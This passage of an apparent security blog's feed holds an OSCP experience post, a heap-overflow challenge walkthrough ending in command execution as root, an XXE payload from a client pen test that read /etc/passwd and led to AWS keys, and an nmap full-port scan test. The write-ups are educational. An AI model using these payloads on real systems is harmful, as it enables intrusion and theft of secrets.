+  &lt;li&gt;I wasted time banging my head against something I thought was going to work. I even told myself it wasn’t going to work. I continued to hit it. Don’t do that.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;DON’T be put off by the Buffer Overflow content. It’s the best bit!&lt;/li&gt;
+  &lt;li&gt;The course materials will take you from 0 to OSCP, it just takes time and effort.&lt;/li&gt;
+  &lt;li&gt;The exam is difficult, and it should be ‘feared’ but don’t let it hinder your progression. If you fail, so what? Just re-book it, study up and hit it again.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Overall, enjoy it. It’s 24 hours of hacking (if you don’t sleep). OffSec care about their students, if you have any questions just ping them. I made heavy use of their live chat because I’m smart enough to literally break everything, all the time.
+You’ll miss it when it’s over, I know I do. So make the most of it!&lt;/p&gt;
+
+&lt;p&gt;Good luck if you are planning to take the course and exam yourself. It’s definitely worth the time and effort 🙂&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">I passed my OSCP in June 2018, so this post is a little late. But honestly, I figured everyone else writes one almost immediately, fuelled by the joy/sadness of receiving the email from OffSec. I did think about writing one straight away but I didn’t really know how it would differ to anyone else… “I passed. Exam was hard. Labs was fun. Well worth it. Woooooh.” So a few months down the line, I figured I could post some points about my personal experience with OffSec’s PWK course (and ultimately, the very popular OSCP certification). I don’t really want to sit here and recommend resources and pre-requisites for everyone to be able to one shot the exam. These kind of blogs can be found with a simple Google, infact – some people even dump an entire A-Z on Github, so I’m sure if you’re good enough at Google then you’ll find it. However, that’d ruin the whole experience (in my opinion). The following sections of this post contain 3 main topics “Before”, “During” and “After” my time with OffSec, what I learnt and any recommendations I have regarding the entire course and exam. Again, to reiterate – this won’t be a “Do this box on Vulnhub and you’ll pass”, it’s more of a holistic view of everything around gaining your OSCP certification. As well as these 3 main sections, I will break down my course purchase and conclude with any final thoughts. A quick breakdown Lab time purchased: 90 days Started: March 2018 Exam: End of May 2018 Exam Attempts: 1 Additional: Completed the lab report as soon as I could (possibility for extra marks) Spent ~2 hours a day chipping away due to work and University Before my lab time Started from scratch** on Hack the Box (HTB), and just about reached the ‘Pro Hacker’ rank. I’d been to 1 face to face CTF which I was terrible at. I had dabbled with very basic Buffer Overflows (no ROP, Ret2LibC, Canaries, DEP, ASLR etc). Had very limited knowledge of web exploitation (xss, no sqli). Awful at enumeration (pre and post), I successfully missed obvious things a lot. I thought long sessions of hacking and energy drinks were a good idea. I knew C, a bit of Python, no bash, and my Kali (linux overall) skills were limited (I knew various other languages which were of no use here…) ** When I say scratch… I mean scratch. I was googling how to ‘scan ports’ and ‘how to hack WordPress.’ I didn’t even know what a reverse shell was, I just knew I wanted to get one. Trust me, I was clueless. During my lab time Enumeration became the key to my lab success. The PWK course material carried me through the lab. I used the rubber duck approach with non-technical beings. I talked to my lizard, tarantula and girlfriend about various systems and my approach, receiving 0 feedback. This made me explain it further and further until the answer was literally on the tip of my tongue. (Great technique for debugging code too!) *Metasploit wasn’t the only option (99.9% of the time). C, Python, Bash and (minor) x86 asm is your friend. The “try harder” attitude didn’t really help me, unless it’s used in a sense of “you’re at the right door, just keep trying”. When it’s some kid who can’t even sign up on HtB spamming it on discord, it’s just not worth reading it. Custom cheat sheets for my own tools/scripts, enumeration methods and overflow techniques really helped relieve stress when it came to using them against a target. After I received my “pass” A nice sleep during the exam was literally all I needed. Enumeration WAS (and still is) the key to my “success”. Energy drinks just increased palpitations, eat and drink healthier stuff throughout. Don’t enhance your stress! I wasted time banging my head against something I thought was going to work. I even told myself it wasn’t going to work. I continued to hit it. Don’t do that. Final thoughts DON’T be put off by the Buffer Overflow content. It’s the best bit! The course materials will take you from 0 to OSCP, it just takes time and effort. The exam is difficult, and it should be ‘feared’ but don’t let it hinder your progression. If you fail, so what? Just re-book it, study up and hit it again. Overall, enjoy it. It’s 24 hours of hacking (if you don’t sleep). OffSec care about their students, if you have any questions just ping them. I made heavy use of their live chat because I’m smart enough to literally break everything, all the time. You’ll miss it when it’s over, I know I do. So make the most of it! Good luck if you are planning to take the course and exam yourself. It’s definitely worth the time and effort 🙂</summary></entry><entry><title type="html">Basic Heap Overflow</title><link href="http://localhost:4000/2019-02-24/basic_heap_overflow" rel="alternate" type="text/html" title="Basic Heap Overflow" /><published>2019-02-24T00:00:00+00:00</published><updated>2019-02-24T00:00:00+00:00</updated><id>http://localhost:4000/2019-02-24/basic_heap_overflow</id><content type="html" xml:base="http://localhost:4000/2019-02-24/basic_heap_overflow">&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;I finally had some time to get back to Billy’s ARM exploitation challenges found on his &lt;a href=&quot;https://github.com/Billy-Ellis/Exploit-Challenges&quot;&gt;github&lt;/a&gt;. Until now, I have only really focused on the stack based vulnerabilities so I wanted to try some of his Heap based challenges. This post covers my approach to completing his ‘Heap Level 1’ challenge.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-challenge&quot;&gt;The Challenge:&lt;/h2&gt;
+&lt;p&gt;The first Heap challenge that he released contained a very simple heap overflow vulnerability that allows the execution of a custom system command. The following output is produced from executing the binary:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Garys-iPhone:/lab/rop root# ./heaplevel1 
+Usage: ./heaplevel1 &amp;lt;username&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From above, we can see that the binary takes a single argument; the username. Executing the binary with a specified username executes additional code and produces different output:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Garys-iPhone:/lab/rop root# ./heaplevel1 test
+Welcome to heaplevel1, created by @bellis1000
+User: test is executing command &quot;date&quot;
+Sun Feb 24 01:48:27 GMT 2019
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;inspecting-the-binary&quot;&gt;Inspecting the Binary&lt;/h2&gt;
+&lt;p&gt;To see what’s going on inside the binary, we can make use of a disassembler, for this step I used Hopper, but other tools will help accomplish the same.&lt;/p&gt;
+
+&lt;p&gt;Looking at the following code, we can see there are two malloc functions. As this binary was compiled for the ARM architecture, we can picture the malloc() functions and the values used within their parameters.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;void *malloc(size_t size)&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;In ARM, the R1 register is used to hold the value of the first parameter of a function, so from the following code we can see that the value ‘0x80’ is moved into R1 before the malloc() function is called.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0000be4c         movw       r1, #0x80
+0000be50         str        r0, [sp, #0x30 + var_1C]
+0000be54         mov        r0, r1
+0000be58         bl         imp___symbolstub1__malloc
+0000be5c         movw       r1, #0x80
+0000be60         str        r0, [r7, #-0x10]
+0000be64         mov        r0, r1
+0000be68         bl         imp___symbolstub1__malloc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;0x80 in decimal is 128, so we know that both malloc calls pass the decimal value of 128 in as a parameter and allocate 128 bytes of heap memory.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;malloc(128);&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Based on the two call’s occuring one after the other, both allocations will likely be next to each other within memory however we can dig deeper into this at runtime using GDB. Before we do this, there are a few more things we can do to help make our debugging a little smoother. The following list holds some points that we need to keep in mind whilst stepping through each instruction:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;1st malloc() -&amp;gt; 0xbe58&lt;/li&gt;
+  &lt;li&gt;2nd malloc() -&amp;gt; 0xbe68&lt;/li&gt;
+  &lt;li&gt;1st strcpy() -&amp;gt; 0xbe80, loads ‘date’ system call into the 1st heap buffer&lt;/li&gt;
+  &lt;li&gt;2nd strcpy() -&amp;gt; 0xbea0, loads the username into the 2nd heap buffer&lt;/li&gt;
+  &lt;li&gt;printf() -&amp;gt; 0xbec4, prints the username and target system call to use&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;runtime-analysis&quot;&gt;Runtime analysis:&lt;/h2&gt;
+&lt;p&gt;Breakpoint 0xbec4
+Run to it, dump registers. See that r1 is the init’d string, r2 is the username and r3 is the system call.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) c
+Continuing.
+Welcome to heaplevel1, created by @bellis1000
+
+Breakpoint 2, 0x0000bec4 in main ()
+(gdb) i r
+r0             0xbfbd	49085
+r1             0x14b010	1355792
+r2             0x14b090	1355920
+r3             0x14b090	1355920
+r4             0x0	0
+r5             0x0	0
+r6             0x0	0
+r7             0x27dff758	668989272
+r8             0x27dff75c	668989276
+r9             0x3a80ce30	981519920
+r10            0x0	0
+r11            0x0	0
+r12            0x14b091	1355921
+sp             0x27dff728	668989224
+lr             0x38a63ddf	950418911
+pc             0xbec4	48836
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;View the addresses the r1, r2 and r3 to picture the printed output.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/w 0xbfbd
+0xbfbd:  &quot;\033[36mUser: %s is executing command \&quot;%s\&quot;\n&quot;
+(gdb) x/w 0x14b010
+0x14b010:  'A' &amp;lt;repeats 128 times&amp;gt;
+(gdb) x/2w 0x14b010
+0x14b010:  'A' &amp;lt;repeats 128 times&amp;gt;
+0x14b091:  &quot;ate&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Run it again with 128 A’s and 4 B’s.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Welcome to heaplevel1, created by @bellis1000
+User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB is executing command &quot;BBBB&quot;
+sh: BBBB: command not found
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We now know that the BBBB overwrites the value stored in the address that is used during the execution of the system command.
+Minus the r2 addr from r3 addr == 128 bytes, proof that the heap allocs are next to each other.&lt;/p&gt;
+
+&lt;p&gt;128 A’s with ‘whoami’ == overflow into code exec&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 2, 0x0000bec4 in main ()
+(gdb) i r
+r0             0xbfbd	49085
+r1             0x155c20	1399840
+r2             0x155ca0	1399968
+r3             0x155ca0	1399968
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) x/10w 0x155c20
+0x155c20:  'A' &amp;lt;repeats 128 times&amp;gt;, &quot;whoami&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;(gdb) c
+Continuing.
+User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwhoami is executing command &quot;whoami&quot;
+root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;conclusion-and-my-thoughts&quot;&gt;Conclusion and my thoughts:&lt;/h2&gt;
+
+&lt;p&gt;I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter.&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading.&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Intro I finally had some time to get back to Billy’s ARM exploitation challenges found on his github. Until now, I have only really focused on the stack based vulnerabilities so I wanted to try some of his Heap based challenges. This post covers my approach to completing his ‘Heap Level 1’ challenge. The Challenge: The first Heap challenge that he released contained a very simple heap overflow vulnerability that allows the execution of a custom system command. The following output is produced from executing the binary: Garys-iPhone:/lab/rop root# ./heaplevel1 Usage: ./heaplevel1 &amp;lt;username&amp;gt; From above, we can see that the binary takes a single argument; the username. Executing the binary with a specified username executes additional code and produces different output: Garys-iPhone:/lab/rop root# ./heaplevel1 test Welcome to heaplevel1, created by @bellis1000 User: test is executing command &quot;date&quot; Sun Feb 24 01:48:27 GMT 2019 Inspecting the Binary To see what’s going on inside the binary, we can make use of a disassembler, for this step I used Hopper, but other tools will help accomplish the same. Looking at the following code, we can see there are two malloc functions. As this binary was compiled for the ARM architecture, we can picture the malloc() functions and the values used within their parameters. void *malloc(size_t size) In ARM, the R1 register is used to hold the value of the first parameter of a function, so from the following code we can see that the value ‘0x80’ is moved into R1 before the malloc() function is called. 0000be4c movw r1, #0x80 0000be50 str r0, [sp, #0x30 + var_1C] 0000be54 mov r0, r1 0000be58 bl imp___symbolstub1__malloc 0000be5c movw r1, #0x80 0000be60 str r0, [r7, #-0x10] 0000be64 mov r0, r1 0000be68 bl imp___symbolstub1__malloc 0x80 in decimal is 128, so we know that both malloc calls pass the decimal value of 128 in as a parameter and allocate 128 bytes of heap memory. malloc(128); Based on the two call’s occuring one after the other, both allocations will likely be next to each other within memory however we can dig deeper into this at runtime using GDB. Before we do this, there are a few more things we can do to help make our debugging a little smoother. The following list holds some points that we need to keep in mind whilst stepping through each instruction: 1st malloc() -&amp;gt; 0xbe58 2nd malloc() -&amp;gt; 0xbe68 1st strcpy() -&amp;gt; 0xbe80, loads ‘date’ system call into the 1st heap buffer 2nd strcpy() -&amp;gt; 0xbea0, loads the username into the 2nd heap buffer printf() -&amp;gt; 0xbec4, prints the username and target system call to use Runtime analysis: Breakpoint 0xbec4 Run to it, dump registers. See that r1 is the init’d string, r2 is the username and r3 is the system call. (gdb) c Continuing. Welcome to heaplevel1, created by @bellis1000 Breakpoint 2, 0x0000bec4 in main () (gdb) i r r0 0xbfbd 49085 r1 0x14b010 1355792 r2 0x14b090 1355920 r3 0x14b090 1355920 r4 0x0 0 r5 0x0 0 r6 0x0 0 r7 0x27dff758 668989272 r8 0x27dff75c 668989276 r9 0x3a80ce30 981519920 r10 0x0 0 r11 0x0 0 r12 0x14b091 1355921 sp 0x27dff728 668989224 lr 0x38a63ddf 950418911 pc 0xbec4 48836 View the addresses the r1, r2 and r3 to picture the printed output. (gdb) x/w 0xbfbd 0xbfbd: &quot;\033[36mUser: %s is executing command \&quot;%s\&quot;\n&quot; (gdb) x/w 0x14b010 0x14b010: 'A' &amp;lt;repeats 128 times&amp;gt; (gdb) x/2w 0x14b010 0x14b010: 'A' &amp;lt;repeats 128 times&amp;gt; 0x14b091: &quot;ate&quot; Run it again with 128 A’s and 4 B’s. Welcome to heaplevel1, created by @bellis1000 User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB is executing command &quot;BBBB&quot; sh: BBBB: command not found We now know that the BBBB overwrites the value stored in the address that is used during the execution of the system command. Minus the r2 addr from r3 addr == 128 bytes, proof that the heap allocs are next to each other. 128 A’s with ‘whoami’ == overflow into code exec Breakpoint 2, 0x0000bec4 in main () (gdb) i r r0 0xbfbd 49085 r1 0x155c20 1399840 r2 0x155ca0 1399968 r3 0x155ca0 1399968 (gdb) x/10w 0x155c20 0x155c20: 'A' &amp;lt;repeats 128 times&amp;gt;, &quot;whoami&quot; (gdb) c Continuing. User: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwhoami is executing command &quot;whoami&quot; root Conclusion and my thoughts: I would be interested to hear feedback about this technique and whether or not there are further ways to increase the reliability of the results as well as maintaining the speed. Let me know your thoughts on twitter. Thanks for reading.</summary></entry><entry><title type="html">My first XXE in the wild</title><link href="http://localhost:4000/2018-11-11/first_wild_xxe" rel="alternate" type="text/html" title="My first XXE in the wild" /><published>2018-11-11T00:00:00+00:00</published><updated>2018-11-11T00:00:00+00:00</updated><id>http://localhost:4000/2018-11-11/first_wild_xxe</id><content type="html" xml:base="http://localhost:4000/2018-11-11/first_wild_xxe">&lt;p&gt;&lt;em&gt;Disclaimer: This information was found during a pen-test on a client. For that reason, my explanations and examples will be very vague and contain no sensitive information relative to the target but it will be kept close to the actual finding.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;If you’re not sure what XXE is, please refer to OWASP’s wiki page.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;initial-finding&quot;&gt;Initial finding&lt;/h2&gt;
+
+&lt;p&gt;Whilst enumerating the target web app, various features were found that allowed authenticated users to upload their own data. An example of an XML template was obtainable via a download and presented the correct method of including custom data that the application could parse. As soon as I saw that XML was usable I started crafting small payloads just to test for XXE vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;I initially tried to read a file with a name that definitely wouldn’t exist to see if I could leak any information about the target environment.&lt;/p&gt;
+
+&lt;p&gt;The redacted XML file I used was:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE file [  
+   &amp;lt;!ELEMENT file ANY &amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;cp&quot;&gt;&amp;lt;!ENTITY xxe SYSTEM &quot;file://_definitely_doesnt_exist_asdfasdf&quot; &amp;gt;&lt;/span&gt;
+  ]&amp;gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;root&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;name&amp;gt;&lt;/span&gt;&lt;span class=&quot;ni&quot;&gt;&amp;amp;xxe;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/name&amp;gt;&lt;/span&gt;
+    [Redacted fields]
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/root&amp;gt;&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After uploading the crafted file, an error was printed within a field that would have been populated by the XML node field, proving my XXE payload had triggered and was returning data. The error was a ‘File Not Found’ error and included the whole file-path to the current location. Ultimately this information leak provided me with the following information:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;I was targeting a Linux environment&lt;/li&gt;
+  &lt;li&gt;I had an XXE vulnerability to leverage&lt;/li&gt;
+  &lt;li&gt;I effectively had RCE&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;With these 3 points I was able to start leaking sensitive files such as /etc/passwd, configuration files and source code that would only normally be utilised by the server to help potentially find other weaknesses and issues within the target.&lt;/p&gt;
+
+&lt;p&gt;What came next?
+I crafted a short python script that performed the XXE vulnerable request over and over again. Each iteration attempted to obtain a different file from a dictionary I provided. Ultimately, I had created a brute force tool, similar to “dirbuster”, but specifically for enumerating the internal files and directories of my target. Using this quick tool lead to leaking the AWS secret keys… game over \o/&lt;/p&gt;
+
+&lt;p&gt;The use of this tool probably wasn’t the most efficient approach, but it worked in this case. However, this accompanied by a ‘Billion Laughs’ attack lead to some issues for the client’s environment. Great news for the report though ;)&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Disclaimer: This information was found during a pen-test on a client. For that reason, my explanations and examples will be very vague and contain no sensitive information relative to the target but it will be kept close to the actual finding. If you’re not sure what XXE is, please refer to OWASP’s wiki page. Initial finding Whilst enumerating the target web app, various features were found that allowed authenticated users to upload their own data. An example of an XML template was obtainable via a download and presented the correct method of including custom data that the application could parse. As soon as I saw that XML was usable I started crafting small payloads just to test for XXE vulnerabilities. I initially tried to read a file with a name that definitely wouldn’t exist to see if I could leak any information about the target environment. The redacted XML file I used was: &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&amp;gt; &amp;lt;!DOCTYPE file [ &amp;lt;!ELEMENT file ANY &amp;gt; &amp;lt;!ENTITY xxe SYSTEM &quot;file://_definitely_doesnt_exist_asdfasdf&quot; &amp;gt; ]&amp;gt; &amp;lt;root&amp;gt; &amp;lt;name&amp;gt;&amp;amp;xxe;&amp;lt;/name&amp;gt; [Redacted fields] &amp;lt;/root&amp;gt; After uploading the crafted file, an error was printed within a field that would have been populated by the XML node field, proving my XXE payload had triggered and was returning data. The error was a ‘File Not Found’ error and included the whole file-path to the current location. Ultimately this information leak provided me with the following information: I was targeting a Linux environment I had an XXE vulnerability to leverage I effectively had RCE With these 3 points I was able to start leaking sensitive files such as /etc/passwd, configuration files and source code that would only normally be utilised by the server to help potentially find other weaknesses and issues within the target. What came next? I crafted a short python script that performed the XXE vulnerable request over and over again. Each iteration attempted to obtain a different file from a dictionary I provided. Ultimately, I had created a brute force tool, similar to “dirbuster”, but specifically for enumerating the internal files and directories of my target. Using this quick tool lead to leaking the AWS secret keys… game over \o/ The use of this tool probably wasn’t the most efficient approach, but it worked in this case. However, this accompanied by a ‘Billion Laughs’ attack lead to some issues for the client’s environment. Great news for the report though ;)</summary></entry><entry><title type="html">My go to full range scan</title><link href="http://localhost:4000/2018-06-01/my_go_to_port_scan" rel="alternate" type="text/html" title="My go to full range scan" /><published>2018-06-01T00:00:00+01:00</published><updated>2018-06-01T00:00:00+01:00</updated><id>http://localhost:4000/2018-06-01/my_go_to_port_scan</id><content type="html" xml:base="http://localhost:4000/2018-06-01/my_go_to_port_scan">&lt;h2 id=&quot;intro&quot;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;Recently I have been using a specific scan for my initial checks on a target system. The method I use scans the entire range of ports on both the TCP and UDP channels. As it has helped me out so much, I thought I would share.&lt;/p&gt;
+
+&lt;p&gt;Disclaimer: This technique is most likely known and used by many, but fingers crossed some viewers will find use for it! I have only ever performed this within CTF’s/lab environments, please be sure to understand your target environment before firing off scans blindly.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-command&quot;&gt;The command:&lt;/h2&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -sU --min-rate 5000 --max-retries 1  -p- &amp;lt;target&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;arguments&quot;&gt;Arguments:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;-sT : TCP Connect() technique&lt;/li&gt;
+  &lt;li&gt;-sU : enable UDP scanning&lt;/li&gt;
+  &lt;li&gt;–min-rate : sets the slowest amount packets that can be sent each second&lt;/li&gt;
+  &lt;li&gt;–max-retries : limits the number of port scan probe retransmissions&lt;/li&gt;
+  &lt;li&gt;-p- : Specifies to scan the entire port range (1 to 65535)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;To view all other possibilities, check out nmap’s man page.&lt;/p&gt;
+
+&lt;h2 id=&quot;benefits&quot;&gt;Benefits:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Very quick scan&lt;/li&gt;
+  &lt;li&gt;Probes every possible port on the target, not just the top 1000 common ports like other scans&lt;/li&gt;
+  &lt;li&gt;Can help identify obscure ports that are being utilised by services&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;detriments&quot;&gt;Detriments:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Not the quiestest traffic (see below for test results)&lt;/li&gt;
+  &lt;li&gt;Can produce results that misses a port that is found in another scan&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;tests&quot;&gt;Tests:&lt;/h2&gt;
+
+&lt;p&gt;In order to help understand one of the detriments I listed above, I wanted to perform a couple of nmap scans against a chosen target, on a safe network. I used iptables to gather the results. In order to make sure the traffic was gathered during a scan, I configured iptables using the following set of commands.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# iptables -I INPUT 1 -s 10.11.1.5 -j ACCEPT
+root@kali:~/Documents# iptables -I OUTPUT 1 -d 10.11.1.5 -j ACCEPT
+root@kali:~/Documents# iptables -Z
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The main focus of the tests was to gain an understanding of the amount of bytes that were sent across the network during a scan, relative to the time it took to complete and the ports that were found during a scan. I made sure to clear the obtained data before each different scan (-Z argument).&lt;/p&gt;
+
+&lt;p&gt;Test 1:&lt;/p&gt;
+
+&lt;p&gt;My chosen technique, scanning the entire port range across both TCP and UDP channels.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# nmap -sT -sU --min-rate 5000 --max-retries 1  -p- 10.11.1.5
+Not shown: 61350 closed ports, 57737 filtered ports, 11980 open|filtered ports
+PORT    STATE SERVICE
+135/tcp open  msrpc
+139/tcp open  netbios-ssn
+135/udp open  msrpc
+MAC Address: 00:50:56:89:70:15 (VMware)
+Nmap done: 1 IP address (1 host up) scanned in 51.75 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Results:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# iptables -vn -L
+Chain INPUT (policy ACCEPT 201K packets, 29M bytes)
+pkts bytes target     prot opt in     out     source               destination
+201K 9725K ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
+0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
+0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
+Chain FORWARD (policy ACCEPT 0 packets, 0 bytes)
+pkts bytes target     prot opt in     out     source               destination
+Chain OUTPUT (policy ACCEPT 254K packets, 33M bytes)
+pkts bytes target     prot opt in     out     source               destination
+254K   11M ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
+0     0 ACCEPT     all  ---  *      *       0.0.0.0/0            10.11.1.5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Test 2:&lt;/p&gt;
+
+&lt;p&gt;Notes: Default nmap scan, top 1000 common ports&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# nmap 10.11.1.5
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-26 16:29 BST
+Nmap scan report for 10.11.1.5
+Host is up (0.13s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+3389/tcp open  ms-wbt-server
+MAC Address: 00:50:56:89:70:15 (VMware)
+Nmap done: 1 IP address (1 host up) scanned in 7.11 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Results:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Documents# iptables -vn -L
+Chain INPUT (policy ACCEPT 1378 packets, 205K bytes)
+pkts bytes target     prot opt in     out     source               destination
+1185 47980 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
+0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
+0     0 ACCEPT     all  ---  *      *       10.11.1.5            0.0.0.0/0
